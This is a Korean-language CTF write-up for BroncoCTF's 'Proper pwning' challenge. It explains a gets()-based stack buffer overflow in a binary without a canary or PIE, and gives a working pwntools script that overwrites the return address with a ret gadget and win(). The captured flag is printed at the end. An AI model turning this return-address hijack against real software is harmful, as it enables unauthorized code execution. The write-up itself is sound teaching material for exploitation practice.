---
ctf_name: "BroncoCTF"
challenge_name: "Proper pwning"
category: "pwn"           # web / pwn / rev / crypto / misc
difficulty: "easy"      # easy / medium / hard / insane
author: "aswe0810m"
date: "2026-07-14"
points: 10
tags: [SBO, Stack Alignment]
---

# Proper pwning

## 문제 설명

> Proper Pwning
>
> ✦✦✦
> yoshie878
> 
> Have you read the Pwntorial? Ready to graduate from baby pwns?
> 
> This should do it. Three gates and a treasure room await your input.

- nc 0.cloud.chals.io 21543
- sc broncoctf-proper-pwning.chals.io
- 바이너리 파일 `proper`, C 코드 `proper.c`, Docker 파일 제공 

## 풀이

### 분석

SBO를 연습하는 문제로, 문제에서 제공된 gate 함수에서 점점 조건이 붙는다.

**보호기법:**
- RELRO: Partial RELRO
- stack: No canary found
- NX: NX unknown
- PIE: No PIE

**매크로상수**:
- CLOSED 0
- ALIVE 41

**주요함수:**
- main(): gate1()에서 요구하는 값 변조를 성공하면 gate2()로 흐름이 넘어가고, gate2()에서 요구하는 값 변조를 성공하면 gate3()으로 넘어간다.

- gate1(): gate 변수가 CLOSED로 처음에 설정되어 있으며, buffer[64]가 정의되어 있다. gets() 함수로 buffer에 값을 받고 gate 변수가 CLOSED가 아니도록 변조해야 한다.

- gate2(): gate 변수가 CLOSED로 처음에 정의되어 있고, baby_chicken 변수가 ALIVE로 처음에 정의되어 있고, buffer[64]가 정의되어 있다. gets() 함수로 buffer에 값을 받고 gate 변수가 CLOSED가 아니면서 baby_chicken 변수의 값은 변조 되지 않도록 해야한다.

- gate3(): gate 변수가 CLOSED로 처음에 설정되어 있고, buffer[67]이 정의되어 있다. gets() 함수로 buffer에 값을 받고 gate 값이 정확히 13371337이 되도록 변조해야 한다.

- win(): system 함수로 flag.txt를 출력한다.

### 취약점

gets() 함수는 크기를 입력 받지 않는다. 따라서 SBO 취약점이 발생한다. 따라서 문제에서 요구하는 gate 변수의 값을 변조할 수 있다. 그런데 바이너리에 canary가 존재하지 않기 때문에 애초에 ret 주소를 win으로 변조하면 gate2, gate3 등을 거치지 않고 바로 익스플로잇할 수 있다.

### 익스플로잇

gdb를 통해서 패딩해야하는 값을 확인해보니 gate1() 함수 프레임은 0x120이고, buffer는 0x110 만큼 내려간 부분에서서 시작되므로 0x110만큼 패딩한 후, rbp를 0x8만큼 패딩한 후, win_addr로 값을 덮어써서 익스플로잇 할 수 있을 것이라고 판단하였다. 하지만 이렇게 작성하여 실행해보면 flag 값이 출력되지 않는다. system 함수의 경우 스택이 16바이트로 정렬되어 있어야하기 때문에 이런 문제가 발생한 것이다. 따라서 ret가젯을 통해서 8바이트 만큼 더 패딩해주어 문제를 해결할 수 있었다.

```python
from pwn import *

context.arch = 'amd64'

p = remote('0.cloud.chals.io', 21543)
e = ELF('./proper')

win_addr = e.symbols['win']
ret = next(e.search(asm('ret')))

payload = b'A'*0x110
payload += b'B'*8
payload += p64(ret)
payload += p64(win_addr)

p.sendline(payload)
p.interactive()
```

## 플래그

```
bronco{1m_th3_b35t_PWN3r_1n_th3_wh0l3_w1d3_w0r1d}
```

## 배운 점

- system 함수를 실행할 때 16바이트 패딩이 필요하다는 내용을 전에 공부할 때 봐었었는데, ctf에서 실제로 풀때 제대로 값이 나오지 않으니 바로 문제를 알아채지 못했다. 하지만 이번에 풀면서 이럴 수 있다고 느껴서 다음에는 system 함수를 보면 16바이트 패딩이 필요하다는 것을 바로 생각할 수 있게 될 것 같다.
- 문제에서 원하는 흐름을 굳이 따라가주지 않고 바로 실행흐름을 변경할 수 있다면 변경하여 익스플로잇 할 수 있다고 배울 수 있었다.
